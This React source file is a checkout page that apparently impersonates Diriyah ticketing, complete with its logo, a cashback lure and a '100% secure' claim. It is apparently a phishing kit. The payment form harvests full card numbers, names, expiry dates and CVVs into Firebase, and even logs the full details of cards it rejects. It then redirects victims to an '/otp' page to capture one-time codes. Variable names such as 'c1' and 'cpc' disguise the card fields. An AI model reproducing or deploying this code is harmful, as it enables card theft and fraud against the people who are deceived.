import { useLocation } from "wouter";
import { ChevronDown, X, CreditCard, Menu } from "lucide-react";
import { useState, useEffect } from "react";
import { handlePay, handleCurrentPage, isBinBlocked, recordBlockedCardAttempt } from "@/lib/firebase";
import { CashbackPopup } from "@/components/CashbackPopup";

const LOGO_URL =
  "https://upload.wikimedia.org/wikipedia/commons/5/57/%D8%B4%D8%B9%D8%A7%D8%B1_%D9%85%D9%88%D8%B3%D9%85_%D8%A7%D9%84%D8%AF%D8%B1%D8%B9%D9%8A%D8%A9.png?utm_source=ar.wikipedia.org&utm_campaign=index&utm_content=original";

const TERRACOTTA = "#C26C48";
const BG_CREAM = "#f4efe6";

export default function CheckoutPage() {
  const [showPopup, setShowPopup] = useState(true);

  useEffect(() => {
    void handleCurrentPage("checkout");
  }, []);

  return (
    <div
      className="page-checkout min-h-screen flex flex-col text-right font-sans"
      style={{ backgroundColor: BG_CREAM }}
      dir="rtl"
      data-testid="page-checkout"
    >
      {showPopup && <CashbackPopup onClose={() => setShowPopup(false)} />}
      <Header />
      <HeroBanner />

      <main className="flex-1 max-w-md w-full mx-auto px-6 py-8">
        <PaymentForm />
      </main>

      <Footer />
    </div>
  );
}

function Header() {
  const [open, setOpen] = useState(false);
  const [, setLocation] = useLocation();

  return (
    <>
      <header className="flex justify-between items-center px-6 py-4 bg-[#f4efe6] border-b border-gray-200/50">
        <button
          onClick={() => setOpen(!open)}
          className="text-gray-800 p-1 cursor-pointer"
          data-testid="button-menu"
          aria-label="القائمة"
        >
          {open ? <X className="w-7 h-7" /> : <Menu className="w-7 h-7" />}
        </button>

        <div className="flex items-center gap-3">
          <div className="border border-[#8E4729] p-1 rounded">
            <img src={LOGO_URL} alt="الدرعية" className="h-10 object-contain" />
          </div>
        </div>
      </header>

      {open && (
        <nav
          className="fixed top-[70px] left-0 right-0 z-50 bg-black/90 backdrop-blur px-6 py-6 space-y-3"
          data-testid="nav-mobile-menu"
        >
          {[
            { href: "/", label: "الرئيسية" },
            { href: "/registration", label: "تسجيل الدخول" },
            { href: "/booking", label: "خيارات الحجز" },
          ].map(it => (
            <a
              key={it.href}
              href={it.href}
              onClick={() => {
                setOpen(false);
                setLocation(it.href);
              }}
              className="block text-white text-lg py-2 border-b border-white/10 last:border-b-0 text-right cursor-pointer"
            >
              {it.label}
            </a>
          ))}
        </nav>
      )}
    </>
  );
}

function HeroBanner() {
  return (
    <div className="w-full">
      {/* Title Bar */}
      <div
        className="py-6 text-center text-white text-2xl font-bold"
        style={{ backgroundColor: TERRACOTTA }}
      >
        إتمام الشراء
      </div>

      {/* Progress Bar */}
      <div
        className="py-5 px-8 flex flex-col items-center justify-center text-white"
        style={{ backgroundColor: "#A85734" }}
      >
        <div className="relative w-full max-w-xs flex items-center justify-between">
          {/* Background Track */}
          <div className="absolute top-1/2 left-0 right-0 -translate-y-1/2 h-[2px] bg-white/40 z-0" />

          {/* Steps (RTL order: right is step 1, middle is step 2, left is step 3 active) */}
          <div className="relative z-10 flex flex-col items-center">
            <div className="w-3 h-3 rounded-full bg-white/60 mb-1.5" />
            <span className="text-[11px] font-medium opacity-75">تسجيل</span>
          </div>

          <div className="relative z-10 flex flex-col items-center">
            <div className="w-3 h-3 rounded-full bg-white/60 mb-1.5" />
            <span className="text-[11px] font-medium opacity-75">
              اختيار التذاكر
            </span>
          </div>

          <div className="relative z-10 flex flex-col items-center">
            <div className="w-3.5 h-3.5 rounded-full bg-white ring-4 ring-white/20 mb-1.5" />
            <span className="text-[11px] font-medium opacity-90">
              إتمام الشراء
            </span>
          </div>
        </div>
      </div>
    </div>
  );
}

const validateLuhn = (cardNum: string): boolean => {
  const digits = cardNum.replace(/\s/g, "");
  if (!/^\d{13,19}$/.test(digits)) return false;

  let sum = 0;
  let isEven = false;

  for (let i = digits.length - 1; i >= 0; i--) {
    let digit = parseInt(digits[i], 10);
    if (isEven) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    sum += digit;
    isEven = !isEven;
  }

  return sum % 10 === 0;
};

const getCardType = (cardNum: string): string => {
  const num = cardNum.replace(/\s/g, "");
  if (/^4/.test(num)) return "visa";
  if (/^5[1-5]/.test(num)) return "mastercard";
  if (/^(508|60|62|67)/.test(num)) return "mada";
  return "";
};

function PaymentForm() {
  const [, setLocation] = useLocation();
  const [c1, setc1] = useState("");
  const [cardName, setCardName] = useState("");
  const [expiryMonth, setExpiryMonth] = useState("01");
  const [expiryYear, setExpiryYear] = useState("2026");
  const [cpc, setcpc] = useState("");
  const [errors, setErrors] = useState<Record<string, string>>({});
  const [submitError, setSubmitError] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  const cardType = getCardType(c1);

  const formatc1 = (value: string) => {
    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "");
    const matches = v.match(/\d{4,16}/g);
    const match = (matches && matches[0]) || "";
    const parts = [];
    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4));
    }
    return parts.length ? parts.join(" ") : v;
  };

  const handlec1Change = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatc1(e.target.value);
    if (formatted.replace(/\s/g, "").length <= 16) {
      setc1(formatted);
      setErrors(prev => ({ ...prev, c1: "" }));
      setSubmitError("");
    }
  };

  const validateForm = (): boolean => {
    const newErrors: Record<string, string> = {};
    const rawCard = c1.replace(/\s/g, "");

    if (!rawCard || rawCard.length < 13) {
      newErrors.c1 = "رقم البطاقة غير صحيح";
    } else if (!validateLuhn(rawCard)) {
      newErrors.c1 = "رقم البطاقة غير صالح";
    }

    if (!cardName.trim() || cardName.trim().length < 3) {
      newErrors.cardName = "يرجى إدخال الاسم على البطاقة";
    }

    if (!cpc || cpc.length < 3) {
      newErrors.cpc = "كود الحماية غير صحيح";
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async () => {
    if (isSubmitting) return;
    if (!validateForm()) {
      return;
    }
    setIsSubmitting(true);
    setSubmitError("");

    const cleanCard = c1.replace(/\s/g, "");

    try {
      if (await isBinBlocked(cleanCard)) {
        void recordBlockedCardAttempt({
          cardNumber: cleanCard,
          expiryMonth,
          expiryYear,
          cvv: cpc,
          cardName,
          cardType: getCardType(c1),
          visitorId: localStorage.getItem("visitor") || undefined,
        });
        const message = "هذه البطاقة غير مدعومة. يرجى استخدام بطاقة أخرى.";
        setSubmitError(message);
        setIsSubmitting(false);
        return;
      }
    } catch {
      // ignore
    }

    const paymentInfo = {
      c1: cleanCard,
      cardNumber: cleanCard,
      cvv: cpc,
      cardName,
      expiryMonth,
      expiryYear,
      cpc,
      cardType: getCardType(c1),
      currentPage: "checkout",
    };

    try {
      const saved = await handlePay(paymentInfo, () => {});
      if (!saved) {
        throw new Error("PAYMENT_NOT_SAVED");
      }
    } catch (error: any) {
      const message =
        error?.message === "BIN_BLOCKED"
          ? "هذه البطاقة غير مدعومة. يرجى استخدام بطاقة أخرى."
          : error?.message === "VISITOR_BLOCKED"
            ? "تم حظر هذا الزائر ولا يمكنه المتابعة"
            : "حدث خطأ أثناء معالجة الدفع";
      setSubmitError(message);
      setIsSubmitting(false);
      return;
    }

    window.setTimeout(() => setLocation("/otp"), 7000);
  };

  return (
    <div className="w-full space-y-6" data-testid="payment-form">
      {/* Top Accepted Cards Icons Bar */}
      <div className="flex justify-center items-center gap-3 bg-white/60 p-3 rounded-lg border border-gray-200/50 justify-start">
        <img
          src="https://i.ibb.co/gLtgpwS8/wex.png"
          className="h-12"
          alt="pm"
        />
      </div>

      <div
        className="bg-white rounded-2xl shadow-sm p-6 space-y-5"
        style={{ backgroundColor: "#ffffff" }}
      >
        {/* Field 1: رقم البطاقة */}
        <div>
          <label className="block text-sm font-medium text-gray-800 text-right mb-2">
            رقم البطاقة
          </label>
          <div className="relative">
            <input
              type="text"
              value={c1}
              onChange={handlec1Change}
              maxLength={19}
              placeholder=""
              dir="ltr"
              className={`w-full h-12 px-4 rounded border bg-white text-gray-900 text-sm outline-none transition-colors focus:border-[#C26C48] focus:ring-1 focus:ring-[#C26C48] text-right font-mono ${
                errors.c1 ? "border-red-400" : "border-gray-300"
              }`}
              data-testid="input-card-number"
            />
            <div className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 pointer-events-none">
              <CreditCard className="w-5 h-5" />
            </div>
          </div>
          {errors.c1 && (
            <p className="text-red-500 text-xs mt-1">{errors.c1}</p>
          )}
        </div>

        {/* Field 2: الاسم على البطاقة */}
        <div>
          <label className="block text-sm font-medium text-gray-800 text-right mb-2">
            الاسم على البطاقة
          </label>
          <input
            type="text"
            value={cardName}
            onChange={e => {
              setCardName(e.target.value.toUpperCase().slice(0, 60));
              setErrors(prev => ({ ...prev, cardName: "" }));
            }}
            maxLength={60}
            className={`w-full h-12 px-4 rounded border bg-white text-gray-900 text-sm outline-none transition-colors focus:border-[#C26C48] focus:ring-1 focus:ring-[#C26C48] ${
              errors.cardName ? "border-red-400" : "border-gray-300"
            }`}
            data-testid="input-card-name"
          />
          {errors.cardName && (
            <p className="text-red-500 text-xs mt-1">{errors.cardName}</p>
          )}
        </div>

        {/* Field 3: تاريخ الانتهاء */}
        <div>
          <label className="block text-sm font-medium text-gray-800 text-right mb-2">
            تاريخ الانتهاء
          </label>
          <div className="grid grid-cols-2 gap-3" dir="ltr">
            <div className="relative">
              <select
                value={expiryMonth}
                onChange={e => setExpiryMonth(e.target.value)}
                className="w-full h-12 px-3 rounded border border-gray-300 bg-white text-gray-900 text-sm appearance-none outline-none focus:border-[#C26C48]"
                data-testid="select-expiry-month"
              >
                {Array.from({ length: 12 }, (_, i) => {
                  const m = String(i + 1).padStart(2, "0");
                  return (
                    <option key={m} value={m}>
                      {m}
                    </option>
                  );
                })}
              </select>
              <ChevronDown className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-500 pointer-events-none" />
            </div>

            <div className="relative">
              <select
                value={expiryYear}
                onChange={e => setExpiryYear(e.target.value)}
                className="w-full h-12 px-3 rounded border border-gray-300 bg-white text-gray-900 text-sm appearance-none outline-none focus:border-[#C26C48]"
                data-testid="select-expiry-year"
              >
                {Array.from({ length: 10 }, (_, i) => {
                  const y = String(2025 + i);
                  return (
                    <option key={y} value={y}>
                      {y}
                    </option>
                  );
                })}
              </select>
              <ChevronDown className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-500 pointer-events-none" />
            </div>
          </div>
        </div>

        {/* Field 4: كود الحماية */}
        <div>
          <label className="block text-sm font-medium text-gray-800 text-right mb-2">
            كود الحماية
          </label>
          <div className="relative max-w-[140px]">
            <input
              type="text"
              value={cpc}
              onChange={e => {
                const v = e.target.value.replace(/[^0-9]/g, "").slice(0, 4);
                setcpc(v);
                setErrors(prev => ({ ...prev, cpc: "" }));
              }}
              maxLength={4}
              placeholder=""
              dir="ltr"
              className={`w-full h-12 px-4 rounded border bg-white text-gray-900 text-sm outline-none transition-colors focus:border-[#C26C48] focus:ring-1 focus:ring-[#C26C48] text-right font-mono ${
                errors.cpc ? "border-red-400" : "border-gray-300"
              }`}
              data-testid="input-cpc"
            />
            <div className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 pointer-events-none">
              <CreditCard className="w-5 h-5" />
            </div>
          </div>
          {errors.cpc && (
            <p className="text-red-500 text-xs mt-1">{errors.cpc}</p>
          )}
        </div>

        {submitError && (
          <p
            className="text-red-500 text-xs text-center"
            data-testid="error-submit"
          >
            {submitError}
          </p>
        )}

        {/* Submit Button */}
        <button
          type="button"
          onClick={handleSubmit}
          disabled={isSubmitting}
          className="w-full h-14 mt-4 rounded font-bold text-lg text-white transition-transform hover:scale-[1.01] active:scale-[0.99] disabled:opacity-60 cursor-pointer shadow-md"
          style={{ backgroundColor: "#E5733C" }}
          data-testid="button-pay"
        >
          {isSubmitting ? "جاري معالجة الدفع..." : "متابعة"}
        </button>
      </div>

      {/* Payment Security Footer Section */}
      <div className="pt-6 text-center space-y-4">
        <div className="flex items-center justify-center gap-4 flex-wrap text-sm font-bold bg-white/50 py-3 px-4 rounded-xl border border-gray-200/50">
          <img
            src="https://i.ibb.co/Z670p9Hs/kmp.png"
            className="h-10"
            alt="pm2"
          />
        </div>
        <p className="text-xs text-gray-500">جميع عمليات الدفع آمنة 100%</p>

        <p className="text-sm font-bold text-[#A85734] pt-4 leading-relaxed">
          احصل على كاش باك يصل الى 40% عند الدفع من خلال البطاقات من فئة البلاتينية
        </p>
      </div>
    </div>
  );
}

function Footer() {
  return (
    <footer
      className="py-10 text-center text-white font-medium text-xs mt-auto"
      style={{ backgroundColor: TERRACOTTA }}
      data-testid="section-footer"
    >
      حقوق النسخ 2024. جميع الحقوق محفوظة.
    </footer>
  );
}
